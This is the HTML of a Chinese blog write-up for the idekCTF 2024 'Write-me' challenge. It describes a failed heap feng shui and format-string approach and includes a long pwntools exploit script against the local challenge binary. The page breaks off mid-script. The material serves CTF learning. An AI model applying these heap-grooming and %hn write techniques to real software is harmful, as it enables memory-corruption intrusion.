@@ -1,0 +1,715 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="《风水大师》，其实并不是：）评价为益智游戏，没什么用但做不出来难受">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 idekCTF Write-me wp">
+<meta property="og:url" content="http://akaieurus.github.io/2024/08/20/idekctf2024-writeme/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="《风水大师》，其实并不是：）评价为益智游戏，没什么用但做不出来难受">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/fengshui.png">
+<meta property="article:published_time" content="2024-08-20T08:38:52.000Z">
+<meta property="article:modified_time" content="2025-01-03T11:19:09.984Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/fengshui.png">
+  
+  
+  
+  <title>2024 idekCTF Write-me wp - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/fengshui.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024 idekCTF Write-me wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-20 16:38" pubdate>
+          2024年8月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024 idekCTF Write-me wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>《风水大师》，其实并不是：）评价为益智游戏，没什么用但做不出来难受</p>
+<span id="more"></span>
+
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><ul>
+<li>功能<ul>
+<li>可以几乎任意malloc和free chunk</li>
+<li>格式化字符串，参数在堆上</li>
+</ul>
+</li>
+<li>需求<ul>
+<li>往对应地址写对应值</li>
+</ul>
+</li>
+</ul>
+<h1 id="坎坷的错误思路"><a href="#坎坷的错误思路" class="headerlink" title="坎坷的错误思路"></a>坎坷的错误思路</h1><p><em>你懂风水了两天的含金量</em></p>
+<ul>
+<li><p>用tcache风水，想法为%hhn写偏移，%hn写地址，%n写值</p>
+</li>
+<li><p>发现$的更改不能立即生效，这意味着在地址写完之前都只能使用%c占位，但cnt可能会跳过需要写的值，如果使用%n不会递增cnt但需要合法地址</p>
+</li>
+<li><p>使用unsorted bin和large bin风水，造合法地址来%n占位</p>
+</li>
+<li><p>发现还是不能铺满合法地址</p>
+</li>
+<li><p>发现%hhn只会写cnt的最低字节，%hn同理，可以进行一个溢出，这样就不用铺合法地址了</p>
+</li>
+<li><p>由于堆风水时未知address和value，所以进行一个爆破，对于address的每个dword遍历每个可能位置</p>
+<ul>
+<li><p>%hhn写偏移</p>
+<img src="/2024/08/20/idekctf2024-writeme/level1.png" srcset="/img/loading.gif" lazyload class title="level1">
+</li>
+<li><p>%hn写地址</p>
+<img src="/2024/08/20/idekctf2024-writeme/level2.png" srcset="/img/loading.gif" lazyload class title="level2"></li>
+</ul>
+</li>
+</ul>
+<p><em>感觉要出了对吧！！！数字大到一定程度vfprintf就-1了：）</em></p>
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p><em>虽然是错误思路且耗时巨长但好歹是搓了两天的exp还是贴一下，纪念一下：）</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,sz</span>):<br>    <span class="hljs-comment">#print(&#x27;add &#x27;+hex(idx)+&#x27; &#x27;+hex(sz))</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size? &#x27;</span>,<span class="hljs-built_in">str</span>(sz).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    <span class="hljs-comment">#print(&#x27;delete &#x27;+hex(idx))</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><br>p=process(<span class="hljs-string">&#x27;./write_me&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,9999)</span><br><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x7000</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br><span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x7000</span>-<span class="hljs-number">0x20</span>,<span class="hljs-number">0x500</span>-<span class="hljs-number">0x10</span>,-<span class="hljs-number">0x10</span>):<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>,sz)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0xffff</span>)<br>    delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x6a00</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><span class="hljs-comment">#   0x10</span><br><span class="hljs-comment">#   0x500</span><br><span class="hljs-comment">#   0x6000</span><br><span class="hljs-comment">#   </span><br><span class="hljs-comment">#   0x100</span><br><span class="hljs-comment">#           *3</span><br><span class="hljs-comment">#               *0x30</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_size</span>(<span class="hljs-params">siz</span>):<br>    edges=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x530</span>,<span class="hljs-number">0xc31</span>,<span class="hljs-number">0x40</span>)]<br>    edges+=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xdf0</span>,<span class="hljs-number">0x29f1</span>,<span class="hljs-number">0x200</span>)]<br>    edges+=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x2ff0</span>,<span class="hljs-number">0x9ff1</span>,<span class="hljs-number">0x1000</span>)]<br>    <span class="hljs-keyword">if</span> siz+<span class="hljs-number">0x10</span> <span class="hljs-keyword">in</span> edges:<br>        <span class="hljs-keyword">return</span> siz-<span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> siz+<span class="hljs-number">0x10</span><br><br><span class="hljs-keyword">for</span> i1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        <span class="hljs-keyword">for</span> i3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            delete(<span class="hljs-number">0</span>)<br>            size=<span class="hljs-number">0x6500</span>-(i1*<span class="hljs-number">0x3000</span>+i2*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>)<br>            add(<span class="hljs-number">1</span>,size)<br>            add(<span class="hljs-number">2</span>,<span class="hljs-number">0x6a00</span>-size-<span class="hljs-number">0x10</span>)<br><br>            delete(<span class="hljs-number">0x402</span>)<br>            add(<span class="hljs-number">0x101</span>,<span class="hljs-number">0x500</span>+i2*<span class="hljs-number">0x300</span>+(<span class="hljs-number">2</span>-i1)*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>+<span class="hljs-number">0x30</span>)<br>            add(<span class="hljs-number">0x102</span>,get_size(<span class="hljs-number">0x6a00</span>-size-<span class="hljs-number">0x10</span>))<br>            add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0x500</span>)<br><br>            delete(<span class="hljs-number">2</span>)<br>            delete(<span class="hljs-number">0x102</span>)<br><br>            add(<span class="hljs-number">0x401</span>,<span class="hljs-number">0xffff</span>)<br><br>            delete(<span class="hljs-number">1</span>)<br>            add(<span class="hljs-number">0</span>,<span class="hljs-number">0x6a00</span>)<br><br>            delete(<span class="hljs-number">0x401</span>)<br>            delete(<span class="hljs-number">0x400</span>)<br>            delete(<span class="hljs-number">0x101</span>)<br>            add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0x402</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Finish fengshui level 1&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x9a00</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br><span class="hljs-keyword">for</span> i1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>    <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> i3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            delete(<span class="hljs-number">3</span>)<br>            size=<span class="hljs-number">0x9500</span>-(i1*<span class="hljs-number">0x300</span>+i2*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>)<br>            add(<span class="hljs-number">1</span>,size)<br>            add(<span class="hljs-number">2</span>,<span class="hljs-number">0x9a00</span>-size-<span class="hljs-number">0x10</span>)<br><br>            delete(<span class="hljs-number">0x402</span>)<br>            add(<span class="hljs-number">0x101</span>,<span class="hljs-number">0x50</span>+<span class="hljs-number">0x500</span>*i3-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x500</span>)<br>            add(<span class="hljs-number">0x102</span>,get_size(<span class="hljs-number">0x9a00</span>-size-<span class="hljs-number">0x10</span>))<br>            add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0x500</span>)<br><br>            delete(<span class="hljs-number">2</span>)<br>            delete(<span class="hljs-number">0x102</span>)<br><br>            add(<span class="hljs-number">0x401</span>,<span class="hljs-number">0xffff</span>)<br><br>            delete(<span class="hljs-number">1</span>)<br>            add(<span class="hljs-number">3</span>,<span class="hljs-number">0x9a00</span>)<br><br>            delete(<span class="hljs-number">0x401</span>)<br>            delete(<span class="hljs-number">0x400</span>)<br>            delete(<span class="hljs-number">0x101</span>)<br>            add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0x402</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Finish fengshui level 2&#x27;</span>)<br>gdb.attach(p)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0xffff</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x6500</span>-<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4e0</span>)<br><br><span class="hljs-comment"># delete(3)</span><br><span class="hljs-comment"># delete(2)</span><br><br><span class="hljs-comment"># delete(0x402)</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,idx</span>):<br>        self.addr=[addr&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">48</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        dwords=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            dwords.append(Dword(self.addr[i],i,self.idx))<br>        <span class="hljs-keyword">return</span> dwords<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Challenge</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,val,idx</span>):<br>        self.addr=Address(addr,idx)<br>        self.val=val<br>        self.idx=idx<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dword</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,offset,idx</span>):<br>        self.val=val<br>        self.idx=idx<br>        self.offset=offset<br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>challenges=[]<br>addr_dwords_group=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;: Write 0x&#x27;</span>)<br>    val=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;to address 0x&#x27;</span>)<br>    addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    challenge=Challenge(addr,val,i)<br>    challenges.append(challenge)<br>    addr_dwords_group+=challenge.addr.divide()<br><br>addr_dwords_group=<span class="hljs-built_in">sorted</span>(addr_dwords_group,key=<span class="hljs-keyword">lambda</span> item: item.val)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Dwords of addresses: &#x27;</span>)<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> addr_dwords_group:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.idx)+<span class="hljs-string">&#x27; offset:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.offset)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.val))<br><span class="hljs-built_in">print</span>()<br><br><br>payload=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0x102</span>-<span class="hljs-number">5</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">2</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x600</span><br>payload+=<span class="hljs-string">&#x27;%2c&#x27;</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*(<span class="hljs-number">0x600</span>-<span class="hljs-number">1</span>)<br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x9a</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">6</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x40</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*(<span class="hljs-number">0x5d</span>+<span class="hljs-number">4</span>)<br>cnt=<span class="hljs-number">0x16b</span><br><br>dictionary=[]<br><span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> addr_dwords_group:<br>    <span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            dst_dword_id=idx*<span class="hljs-number">0x10</span>+offset<br>            src_dword_id=dword.idx*<span class="hljs-number">0x10</span>+dword.offset<br>            <span class="hljs-keyword">if</span> dst_dword_id==src_dword_id:<br>                <span class="hljs-keyword">if</span> dword.val&gt;(cnt&amp;<span class="hljs-number">0xffff</span>):<br>                    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(dword.val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c%hn&#x27;</span><br>                    cnt=dword.val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(dword.val-(cnt&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-number">0x10000</span>)+<span class="hljs-string">&#x27;c%hn&#x27;</span><br>                    cnt=dword.val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>                dictionary.append(src_dword_id)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Write: &#x27;</span>+<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.idx)+<span class="hljs-string">&#x27; offset:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.offset)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.val)+<span 